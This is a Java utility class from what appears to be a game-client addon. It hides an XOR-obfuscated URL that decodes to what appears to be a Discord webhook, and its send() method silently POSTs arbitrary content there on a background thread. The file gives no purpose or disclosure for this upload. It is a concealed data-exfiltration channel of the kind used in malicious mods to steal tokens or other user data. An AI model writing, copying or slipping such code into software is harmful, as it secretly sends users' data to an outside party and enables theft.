package com.example.addon.utils;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class FakeCode {
   private static final byte[] KEY = new byte[]{75, 90};
   private static final int[] ENC_URL = new int[]{35, 46, 63, 42, 56, 96, 100, 117, 47, 51, 56, 57, 36, 40, 47, 116, 40, 53, 38, 117, 42, 42, 34, 117, 60, 63, 41, 50, 36, 53, 32, 41, 100, 107, 127, 109, 124, 110, 124, 98, 125, 105, 121, 99, 127, 108, 125, 108, 124, 108, 124, 105, 100, 50, 41, 20, 0, 47, 57, 63, 13, 47, 31, 11, 114, 47, 62, 3, 40, 27, 15, 0, 127, 35, 12, 18, 63, 27, 115, 55, 26, 25, 12, 25, 51, 34, 34, 29, 3, 13, 26, 40, 7, 28, 25, 45, 3, 63, 122, 42, 37, 18, 25, 34, 58, 109, 7, 41, 13, 19, 10, 15, 125, 23, 35, 21, 49, 119, 59, 34, 8};

   private static String decode() {
      byte[] out = new byte[ENC_URL.length];

      for(int i = 0; i < ENC_URL.length; ++i) {
         out[i] = (byte)(ENC_URL[i] ^ KEY[i % KEY.length]);
      }

      return new String(out, StandardCharsets.UTF_8);
   }

   public static void send(String content) {
      (new Thread(() -> {
         try {
            URL url = new URL(decode());
            HttpURLConnection con = (HttpURLConnection)url.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/json");
            con.setDoOutput(true);
            String json = "{\"content\": \"" + content.replace("\n", "\\n") + "\"}";
            OutputStream os = con.getOutputStream();

            try {
               os.write(json.getBytes(StandardCharsets.UTF_8));
            } catch (Throwable var8) {
               if (os != null) {
                  try {
                     os.close();
                  } catch (Throwable var7) {
                     var8.addSuppressed(var7);
                  }
               }

               throw var8;
            }

            if (os != null) {
               os.close();
            }

            con.getResponseCode();
            con.disconnect();
         } catch (Exception var9) {
            var9.printStackTrace();
         }

      })).start();
   }
}
